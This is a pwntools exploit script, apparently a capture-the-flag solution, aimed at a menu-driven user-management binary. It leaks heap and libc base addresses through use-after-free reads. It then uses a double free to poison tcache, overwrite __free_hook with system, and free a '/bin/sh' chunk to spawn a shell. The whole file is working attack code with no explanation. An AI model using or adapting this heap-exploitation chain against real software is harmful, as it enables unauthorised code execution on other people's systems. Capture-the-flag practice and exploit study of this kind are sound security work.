#!/usr/bin/python3

from pwn import *

exe = ELF('run_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda p, data: p.send(data)
sa = lambda p, msg, data: p.sendafter(msg, data)
sl = lambda p, data: p.sendline(data)
sla = lambda p, msg, data: p.sendlineafter(msg, data)
sn = lambda p, num: p.send(str(num).encode())
sna = lambda p, msg, num: p.sendafter(msg, str(num).encode())
sln = lambda p, num: p.sendline(str(num).encode())
slna = lambda p, msg, num: p.sendlineafter(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x1841
        brva 0x15E1
        brva 0x16B2
        c
        ''')
        input()


if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])

def restart():
    sla(p, b'> ', b'1')

def add_user(name, password):
    sla(p, b'> ', b'2')
    sa(p, b'username > ', name)
    sa(p, b'password > ', password)

def delete_user(name):
    sla(p, b'> ', b'3')
    sa(p, b'username > ', name)

def change_pass(name, password):
    sla(p, b'> ', b'4')
    sa(p, b'username > ', name)
    sa(p, b'password > ', password)

def view_user():
    sla(p, b'> ', b'5')
###################################
############ LEAK HEAP ############
###################################
add_user(b'2', b'2')
delete_user(b'2')
delete_user(b'root')
add_user(b'1', b'1')
view_user()
heap_leak = u64(p.recv(6).ljust(8, b'\x00'))
heap_base = heap_leak - 0x531
info("HEAP BASE: " + hex(heap_base))
###################################
############ LEAK LIBC ############
###################################
for i in range(30):
    add_user(f"test{i}", b"test")
for i in range(30):
    delete_user(f"test{i}")
restart()
trigger = b'0'*0x500
sla(p, b'> ', trigger)
for i in range(5):
    add_user(f"trash{i}", b"useless")
add_user(b"1", b"1")
view_user()
libc_leak = u64(p.recv(6).ljust(8, b'\x00'))
libc.address = libc_leak - 0x1ecb31
info("LIBC BASE: " + hex(libc.address))
info("LIBC FREE_HOOK: " + hex(libc.sym.__free_hook))
info("LIBC SYSTEM: " + hex(libc.sym.system))
##################################################
############ DOUBLE FREE && GET SHELL ############
##################################################
restart()
add_user(b"haha", b"haha")
view_user()
p.recvuntil(b'haha')
a = p.recvuntil(b':')[:-1]
# print(a)

delete_user(b"haha" + a)
delete_user(b"root")
change_pass(p64(heap_base + 0xa30), p64(0x342))
delete_user(p64(heap_base + 0xa30))
# GDB()
add_user(p64(libc.sym.__free_hook), b'a')
add_user(b'a', b'a')
add_user(p64(libc.sym.system), b'a')
add_user(b'/bin/sh\0', b'a')
delete_user(b'/bin/sh\0')
p.interactive()
